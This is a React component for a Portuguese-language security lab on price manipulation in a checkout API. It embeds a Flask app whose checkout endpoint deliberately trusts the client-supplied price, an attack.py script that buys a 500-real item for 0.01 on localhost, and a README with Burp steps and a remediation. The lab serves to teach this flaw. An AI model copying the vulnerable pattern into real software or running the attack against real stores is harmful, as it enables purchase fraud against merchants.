import { useState } from "react";
import { FileCode, Download, ChevronDown, ChevronRight, FileJson, FileText, Container } from "lucide-react";
import { CodeBlock } from "./CodeBlock";
import { Button } from "./ui/button";
import { cn } from "@/lib/utils";

interface LabFile {
  name: string;
  language: string;
  icon: React.ReactNode;
  content: string;
}

const labFiles: LabFile[] = [
  {
    name: "app.py",
    language: "python",
    icon: <FileCode className="w-4 h-4" />,
    content: `from flask import Flask, jsonify, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# "Banco de dados" em memória
PRODUCTS = {
    101: {
        "id": 101,
        "name": "Implante Neural X9",
        "price": 500.00,
        "description": "Chip de interface neural de última geração"
    }
}

@app.route('/api/product/<int:product_id>', methods=['GET'])
def get_product(product_id):
    """Retorna informações do produto"""
    product = PRODUCTS.get(product_id)
    if not product:
        return jsonify({"error": "Produto não encontrado"}), 404
    return jsonify(product)

@app.route('/api/checkout', methods=['POST'])
def checkout():
    """
    ENDPOINT VULNERÁVEL!
    Aceita o preço enviado pelo cliente sem validação.
    """
    data = request.get_json()
    
    product_id = data.get('product_id')
    # VULNERABILIDADE: Usando o preço do cliente!
    client_price = data.get('price')
    
    if not product_id or client_price is None:
        return jsonify({"error": "Dados inválidos"}), 400
    
    product = PRODUCTS.get(product_id)
    if not product:
        return jsonify({"error": "Produto não encontrado"}), 404
    
    # Processa a "compra" com o preço manipulado
    return jsonify({
        "status": "success",
        "message": "Compra realizada com sucesso!",
        "product": product["name"],
        "paid": client_price,
        "real_price": product["price"]  # Apenas para demonstração
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)`
  },
  {
    name: "attack.py",
    language: "python",
    icon: <FileCode className="w-4 h-4 text-destructive" />,
    content: `#!/usr/bin/env python3
"""
Script de Ataque: Manipulação de Preço
Demonstra exploração de Business Logic Abuse
"""
import requests
import json

API_URL = "http://localhost:8080"

def run_attack():
    print("[*] Iniciando ataque de manipulação de preço...")
    print(f"[*] Alvo: {API_URL}")
    print()
    
    # 1. Obter informações do produto
    print("[*] Obtendo informações do produto...")
    product_resp = requests.get(f"{API_URL}/api/product/101")
    product = product_resp.json()
    
    real_price = product['price']
    print(f"[+] Produto: {product['name']}")
    print(f"[!] Preço real: R$ {real_price:.2f}")
    print()
    
    # 2. Criar payload malicioso
    manipulated_price = 0.01
    payload = {
        "product_id": 101,
        "price": manipulated_price  # PREÇO MANIPULADO!
    }
    
    print("[*] Criando payload malicioso...")
    print(f"[!] Alterando preço: R$ {real_price:.2f} -> R$ {manipulated_price:.2f}")
    print()
    
    # 3. Enviar requisição de checkout
    print("[*] Enviando requisição de checkout...")
    checkout_resp = requests.post(
        f"{API_URL}/api/checkout",
        json=payload,
        headers={"Content-Type": "application/json"}
    )
    
    result = checkout_resp.json()
    print()
    
    # 4. Verificar resultado
    if result.get('status') == 'success':
        print("=" * 50)
        print("[✓] ATAQUE BEM SUCEDIDO!")
        print("=" * 50)
        print(f"[✓] Produto: {result['product']}")
        print(f"[✓] Preço pago: R$ {result['paid']:.2f}")
        print(f"[✓] Preço real: R$ {result['real_price']:.2f}")
        print(f"[✓] Economia ilícita: R$ {result['real_price'] - result['paid']:.2f}")
    else:
        print("[✗] Ataque falhou:", result)

if __name__ == "__main__":
    run_attack()`
  },
  {
    name: "Dockerfile",
    language: "dockerfile",
    icon: <Container className="w-4 h-4" />,
    content: `FROM python:3.11-slim

WORKDIR /app

# Instalar dependências do sistema
RUN apt-get update && apt-get install -y \\
    nginx \\
    && rm -rf /var/lib/apt/lists/*

# Copiar arquivos
COPY requirements.txt .
COPY app.py .
COPY static/ /var/www/html/
COPY nginx.conf /etc/nginx/nginx.conf

# Instalar dependências Python
RUN pip install --no-cache-dir -r requirements.txt

# Script de inicialização
COPY start.sh .
RUN chmod +x start.sh

EXPOSE 8080

CMD ["./start.sh"]`
  },
  {
    name: "requirements.txt",
    language: "text",
    icon: <FileText className="w-4 h-4" />,
    content: `flask==3.0.0
flask-cors==4.0.0
gunicorn==21.2.0
requests==2.31.0`
  },
  {
    name: "README.md",
    language: "markdown",
    icon: <FileText className="w-4 h-4" />,
    content: `# 🔓 Laboratório de Abuso de Lógica de Negócio

## Manipulação de Preço em API de Checkout

Este laboratório demonstra a vulnerabilidade **API6:2023 - Unrestricted Access 
to Sensitive Business Flows** do OWASP API Top 10.

## 🚀 Iniciando o Ambiente

\`\`\`bash
docker build -t price-manipulation-lab .
docker run -p 8080:8080 price-manipulation-lab
\`\`\`

Acesse: http://localhost:8080

## 📋 Cenários de Teste

### 1. Fluxo Legítimo
1. Acesse o frontend
2. Visualize o produto (R$ 500.00)
3. Clique em "Comprar"
4. Observe a requisição enviada

### 2. Teste Manual (Burp Suite)
1. Configure o proxy
2. Intercepte a requisição POST /api/checkout
3. Modifique o campo "price" para 0.01
4. Encaminhe a requisição
5. Observe o sucesso da compra fraudulenta

### 3. Ataque Automatizado
\`\`\`bash
python attack.py
\`\`\`

## 🔍 Vulnerabilidade

**Causa:** O backend confia no preço enviado pelo cliente.

**Impacto:** Atacantes podem comprar produtos por qualquer valor.

## 🛡️ Remediação

\`\`\`python
@app.route('/api/checkout', methods=['POST'])
def checkout_secure():
    data = request.get_json()
    product_id = data.get('product_id')
    
    product = PRODUCTS.get(product_id)
    if not product:
        return jsonify({"error": "Produto não encontrado"}), 404
    
    # CORREÇÃO: Usar preço do servidor!
    real_price = product["price"]
    
    return jsonify({
        "status": "success",
        "paid": real_price
    })
\`\`\``
  }
];

export const LabFiles = () => {
  const [expandedFile, setExpandedFile] = useState<string | null>("app.py");

  const toggleFile = (name: string) => {
    setExpandedFile(expandedFile === name ? null : name);
  };

  const downloadAll = () => {
    const content = labFiles.map(f => `// ===== ${f.name} =====\n\n${f.content}`).join('\n\n\n');
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'security-lab-files.txt';
    a.click();
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <h3 className="font-orbitron text-lg font-bold text-primary">
          Arquivos do Laboratório
        </h3>
        <Button variant="outline" size="sm" onClick={downloadAll} className="gap-2">
          <Download className="w-4 h-4" />
          <span>Baixar Todos</span>
        </Button>
      </div>

      <div className="space-y-2 border border-primary/30 rounded-sm overflow-hidden">
        {labFiles.map((file) => (
          <div key={file.name} className="border-b border-primary/20 last:border-0">
            <button
              onClick={() => toggleFile(file.name)}
              className={cn(
                "w-full flex items-center gap-3 px-4 py-3 text-left transition-colors",
                "hover:bg-primary/10",
                expandedFile === file.name && "bg-primary/5"
              )}
            >
              {expandedFile === file.name ? (
                <ChevronDown className="w-4 h-4 text-primary" />
              ) : (
                <ChevronRight className="w-4 h-4 text-muted-foreground" />
              )}
              {file.icon}
              <span className="font-mono text-sm">{file.name}</span>
              <span className="text-xs text-muted-foreground ml-auto">{file.language}</span>
            </button>
            
            {expandedFile === file.name && (
              <div className="p-4 pt-0 animate-fade-in-up">
                <CodeBlock
                  code={file.content}
                  language={file.language}
                  filename={file.name}
                />
              </div>
            )}
          </div>
        ))}
      </div>
    </div>
  );
};
